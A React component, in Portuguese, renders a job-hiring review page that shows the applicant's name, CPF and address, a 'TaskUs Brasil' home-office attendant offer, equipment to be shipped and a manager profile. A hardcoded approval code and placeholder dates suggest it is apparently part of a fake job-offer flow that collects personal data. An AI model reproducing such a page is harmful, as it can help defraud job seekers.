/* eslint-disable no-unused-vars */


import { ChevronRight, Loader2 } from 'lucide-react';
import { useContext, useEffect, useState } from 'react';
import { motion } from 'framer-motion';
import gerenteImg from "../../../assets/manager-min.webp";
import { ProcessContext } from '../../../contexts/ProcessContextDefinition.js';

const equipamentos = [
    "Notebook Dell 2024",
    "Kit teclado e mouse Dell",
    "Headphone",
    "Mousepad",
    "Camisetas",
    "Crachá"
];

const ReviewContratacao = ({ onContinue }) => {
    const { processData } = useContext(ProcessContext);
    const user = processData?.userData || {};

    const nomeCompleto = user.nome || `${user.firstName || ''} ${user.lastName || ''}`.trim();
    const cpf = user.cpf || "";
    const dataInicio = user.dataInicio || "daqui (15 dias próxima segunda)";
    const turnoTrabalho = user.turnoTrabalho || "20:00 às 05:00 (1h de intervalo)";
    // Monta endereço completo com todos os campos fornecidos pelo usuário
    const enderecoObj = user.enderecoEntrega || {};
    const endereco = user.enderecoEntrega
        ? [
            enderecoObj.rua,
            enderecoObj.numero ? `Nº ${enderecoObj.numero}` : '',
            enderecoObj.complemento,
            enderecoObj.referencia,
            enderecoObj.bairro,
            enderecoObj.municipio?.nome,
            enderecoObj.estado?.sigla
        ]
            .filter(Boolean)
            .join(', ')
        : "endereço não informado";

    const [isLoading, setIsLoading] = useState(false);
    const handleContinue = () => {
        setIsLoading(true);
        setTimeout(() => {
            setIsLoading(false);
            onContinue();
        }, 1000);
    };



    useEffect(() => {
        window.scrollTo({ top: 0, behavior: 'smooth' });
    }, []);




    return (
        <div className="min-h-screen w-full flex flex-col bg-[#181A1B] ">
            {/* Código de aprovação */}
            <div className="flex justify-self-start pt-6 pb-2 ml-5 mb-5">
                <span className="bg-[#1ED760] text-[#181A1B] rounded-full px-4 py-1 font-hendrix-semibold text-xs tracking-wide shadow" style={{ fontSize: '11pt' }}>
                    Código de aprovação: #AIST.76341
                </span>
            </div>

            {/* Título principal */}
            <div className="w-full px-6 mb-2">
                <h1 className="font-hendrix-semibold text-white text-left mb-4" style={{ fontSize: '20pt', lineHeight: 1.2 }}>
                    Agora para finalizar e dar início à sua nova carreira, vamos fazer uma revisão
                </h1>
                <p className="text-[#B3B3B3] font-hendrix-regular text-left mb-4" style={{ fontSize: '13pt', lineHeight: 1.3 }}>
                    Verifique se todas as informações estão corretas. Usaremos elas para gerar os documentos oficiais de contratação.
                </p>
            </div>

            {/* Informações do colaborador */}
            <div className="w-full px-6 mb-2">
                <div className="font-hendrix-semibold text-white mb-3 text-left" style={{ fontSize: '15pt' }}>Informações do colaborador</div>
                <div className="flex flex-col gap-3">
                    {/* Card Nome */}
                    <div className="w-full bg-white rounded-2xl flex items-center justify-between px-5 py-3 shadow" style={{ minHeight: '54px' }}>
                        <span className="font-hendrix-semibold text-[#1655ff] text-lg" style={{ fontSize: '15pt' }}>Nome</span>
                        <span className="font-hendrix-semibold text-[#181A1B] text-lg text-right" style={{ fontSize: '15pt' }}>{nomeCompleto || "Seu nome completo"}</span>
                    </div>
                    {/* Card CPF */}
                    <div className="w-full bg-white rounded-2xl flex items-center justify-between px-5 py-3 shadow" style={{ minHeight: '54px' }}>
                        <span className="font-hendrix-semibold text-[#1655ff] text-lg" style={{ fontSize: '15pt' }}>CPF</span>
                        <span className="font-hendrix-semibold text-[#181A1B] text-lg text-right" style={{ fontSize: '15pt' }}>{cpf || "Seu CPF"}</span>
                    </div>
                </div>
            </div>

            {/* Card de vaga preenchida */}
            <div className="w-full px-6 mb-2">
                <div className="bg-white rounded-[22px] shadow p-6 mb-2" style={{ borderRadius: '22px', boxShadow: '0 2px 8px 0 rgba(22,85,255,0.08)' }}>
                    <div className="font-hendrix-medium text-[#181A1B] mb-1" style={{ fontSize: '14pt', letterSpacing: '0.01em' }}>Vaga preenchida</div>
                    <div className="font-hendrix-semibold text-[#1655ff] mb-2" style={{ fontSize: '21pt', lineHeight: 1.1 }}>Atendente Home Office</div>
                    <div className="border-b border-[#E5E5E5] mb-3"></div>
                    <div className="flex flex-row items-end justify-between mb-3">
                        <div>
                            <div className="font-hendrix-medium text-[#181A1B] text-base mb-1" style={{ fontSize: '13pt' }}>Salário Mensal</div>
                            <div className="font-hendrix-bold text-[#181A1B] text-2xl" style={{ fontSize: '22pt', letterSpacing: '-0.01em' }}>R$2.450,00</div>
                        </div>
                        <div>
                            <div className="font-hendrix-medium text-[#181A1B] text-base mb-1" style={{ fontSize: '13pt' }}>Vale Alimentação</div>
                            <div className="font-hendrix-bold text-[#181A1B] text-2xl" style={{ fontSize: '22pt', letterSpacing: '-0.01em' }}>R$450,00</div>
                        </div>
                    </div>
                    <div className="border-b border-[#E5E5E5] mb-3"></div>
                    <div className="font-hendrix-semibold text-[#181A1B] mb-1" style={{ fontSize: '14pt' }}>+ Benefícios</div>
                    <div className="font-hendrix-regular text-[#6B6B6B] mb-3" style={{ fontSize: '13pt' }}>Plano de saúde, plano odontológico e férias remuneradas.</div>
                    <div className="border-b border-[#E5E5E5] mb-3"></div>
                    <div className="font-hendrix-semibold text-[#181A1B] mb-1" style={{ fontSize: '14pt' }}>Turno de trabalho</div>
                    <div className="font-hendrix-regular text-[#181A1B]" style={{ fontSize: '13pt' }}>
                        {processData?.userData?.dataInicio ? `${processData.userData.dataInicio} ` : ''}
                        {processData?.userData?.turnoTrabalho || turnoTrabalho}
                    </div>
                </div>
            </div>

            {/* Equipamentos enviados */}
            <div className="w-full px-6 mb-5">
                <div className="font-hendrix-semibold text-white mb-2" style={{ fontSize: '13pt' }}>Envios a serem realizados</div>
                <div className="flex flex-col gap-2 mb-4">
                    {equipamentos.map((eq, idx) => (
                        <div
                            key={eq}
                            className="bg-[#181A1B] rounded-xl px-4 py-3 font-hendrix-regular text-white text-base flex items-center justify-between border border-gray-500"
                            style={{ fontSize: '13pt' }}
                        >
                            <span>{idx === 4 ? '3 - ' : '1 - '}{eq}</span>
                        </div>
                    ))}
                </div>
            </div>

            {/* Endereço de entrega */}
            <div className="w-full px-6 mb-10">
                <div className="font-hendrix-semibold text-white mb-1 text-left" style={{ fontSize: '17pt', lineHeight: 1.2 }}>Endereço de entrega</div>
                <div className="text-[#B3B3B3] font-hendrix-regular text-left" style={{ fontSize: '17pt', lineHeight: 1.2 }}>
                    {endereco}
                </div>
            </div>

            {/* Gerente */}
            <div className="w-full px-6 mb-2">
                <div className="font-hendrix-semibold text-white mb-2 text-left" style={{ fontSize: '15pt' }}>Seu gerente</div>
                <div className="bg-[#232323] rounded-2xl shadow flex flex-col items-center pt-5 pb-0 mb-4" style={{ boxShadow: '0 2px 8px 0 rgba(22,85,255,0.08)' }}>

                    <img src={gerenteImg} alt="Antônio Matos" className="w-[95%] max-w-[340px] h-[420px] object-cover rounded-xl mb-0" style={{ marginBottom: '10px', marginTop: '0px' }} />


                    <div className="w-full flex items-center justify-between px-5 py-4" style={{ marginTop: '-10px' }}>
                        <div className="flex items-center gap-2">
                            <span className="w-7 h-7 flex items-center justify-center rounded-full bg-[#1655ff]">
                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="12" fill="#1655ff" /><path d="M17 9l-5 5-3-3" stroke="#fff" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" /></svg>
                            </span>
                            <div className="flex flex-col">
                                <span className="font-hendrix-semibold text-white text-lg" style={{ lineHeight: 1.1 }}>Antônio Matos</span>
                                <span className="font-hendrix-regular text-[#B3B3B3] text-base" style={{ lineHeight: 1.1 }}>Team manager</span>
                            </div>
                        </div>
                        <span className="bg-[#1655ff] text-white rounded-full px-5 py-2 font-hendrix-semibold text-base" style={{ fontSize: '15pt' }}>TaskUs Brasil</span>
                    </div>
                </div>
            </div>

            {/* Botão de confirmar */}
            <div className="w-full px-6 pb-6 flex justify-center">
                <motion.button
                    onClick={handleContinue}
                    disabled={isLoading}
                    whileTap={{ scale: 0.97 }}
                    whileHover={{ scale: isLoading ? 1 : 1.03 }}
                    className={`w-full flex items-center justify-center gap-2 px-6 py-4 rounded-full font-hendrix-medium text-white shadow-md focus:outline-none focus:ring-2 focus:ring-[#1655ff] transition-all duration-300 ${isLoading ? 'opacity-60 cursor-not-allowed' : ''}`}
                    style={{
                        background: 'linear-gradient(90deg, #1655ff 0%, #4285f4 100%)',
                        fontSize: '15pt',
                        boxShadow: '0 2px 8px 0 rgba(22,85,255,0.10)',
                        border: 'none',
                        opacity: isLoading ? 0.7 : 1
                    }}
                >
                    {isLoading ? (
                        <>
                            <motion.div
                                className="w-4 h-4 border-2 border-white border-t-transparent rounded-full mr-2"
                                animate={{ rotate: 360 }}
                                transition={{ repeat: Infinity, duration: 0.8, ease: 'linear' }}
                                style={{ borderTopColor: 'transparent', borderRightColor: 'white', borderBottomColor: 'white', borderLeftColor: 'white' }}
                            />
                            <span className="font-hendrix-medium tracking-wide" style={{ fontSize: '13pt' }}>Carregando...</span>
                        </>
                    ) : (
                        <span className="font-hendrix-medium tracking-wide" style={{ fontSize: '15pt' }}>Confirmar </span>
                    )}
                </motion.button>
            </div>
        </div>
    );
};

export default ReviewContratacao;
